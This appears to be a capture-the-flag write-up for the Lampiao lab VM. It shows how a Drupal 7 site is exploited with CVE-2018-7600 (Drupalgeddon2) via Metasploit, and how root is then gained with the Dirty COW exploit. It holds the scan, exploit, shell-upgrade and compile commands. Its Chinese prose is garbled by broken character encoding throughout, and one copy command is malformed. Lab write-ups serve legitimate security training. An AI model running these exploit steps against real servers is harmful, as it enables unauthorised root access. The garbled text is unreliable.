# lampiao é¶æœºå®éªŒ

<p align="center">
    <img src="http://p1.music.126.net/dbNvuphUc_mDSWLzjzT7fA==/5979144232442840.jpg?param=130y130" width="25%">
</p>

<p align="center">ğŸ‘´ Ahaha I'm hooked on a feeling,I'm high on believing.</p>
<p align="center"><a href="https://music.163.com/#/song?id=28876107"><font>ã€ŠHooked On A Feelingã€‹</font></a> </p>
<p align="center">ä¸“è¾‘ï¼šGuardians of the Galaxy: Awesome Mix Vol. 1</p>
<p align="center">æ­Œæ‰‹ï¼šBlue Swede</p>

> drupal7 cmsè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-7600ï¼‰å’Œè„ç‰›ææƒã€‚

[é¶æœºä¸‹è½½åœ°å€]ï¼š(https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM)


åœ¨å¯¼å…¥åˆ° VMware å å‘ç°æ˜¯ä¸ªç™»å½•ç•Œé¢ï¼Œåœ¨ç¡®è®¤é¶æœº IPæ®µåä½¿ç”¨ `nmap` å¯¹ç›®æ ‡ç½‘æ®µè¿›è¡Œæ‰«æ

`nmap -T5 -v -f -sS -Pn -p- 192.168.91.0/24`

![](img/1.png)

è®¿é—®80ç«¯å£å‘ç°ä¸€ä¸ªæ²¡ç”¨çš„é™æ€é¡µé¢ï¼Œå†è®¿é—®1898ç«¯å£ï¼Œå‡ºç°webé¡µé¢

![](img/2.png)

è¿›è¡Œç›®å½•æ‰«æï¼Œå‘ç°  `robots.txt`

![](img/3.png)

ä½¿ç”¨ç”¨è°·æ­Œæ’ä»¶ `wappalyzer` çŸ¥é“äº†è¿™ä¸ªwebæ˜¯ç”¨ `drupal7 cms`å†™çš„
![](img/4.png)

è®¿é—®ä¿¡æ¯é…ç½®é¡µé¢ `http://192.168.91.134:1898/CHANGELOG.txt`

![](img/5.png)

> å¿«è¿›åˆ° ä½¿ç”¨ CVE-2018-7600 ç‰ˆæœ¬å‘½ä»¤æ‰§è¡Œæ¼æ´

### CVE-2018-7600åˆ©ç”¨

è¿›å…¥msfï¼Œç„¶åsearchæœç´¢CVE-2018-7600
![](img/6.png)

```
use exploit/unix/webapp/drupal_drupalgeddon2
set rhosts IP
set rport 1898
run
```
![](img/7.png)

ç”¨pythonè·å–æ ‡å‡†shell:
python shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```


![](img/8.png)

å»msfä¸­æŸ¥æ‰¾å¯¹åº”çš„exp
```
searchsploit dirty


cp/usr/share/exploitdb/exploits/linux/local/40847.cpp /root/1.cpp

# è¿›å…¥msf upload 1.cpp

g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 1.cpp -lutil
./40847
```
![](img/9.png)

è·å–ç›®æ ‡ root å¯†ç 

sshé‡æ–°è¿æ¥ï¼Œç”¨æˆ·ä¸ºrootï¼Œå¯†ç ä¸º dirtyCowFun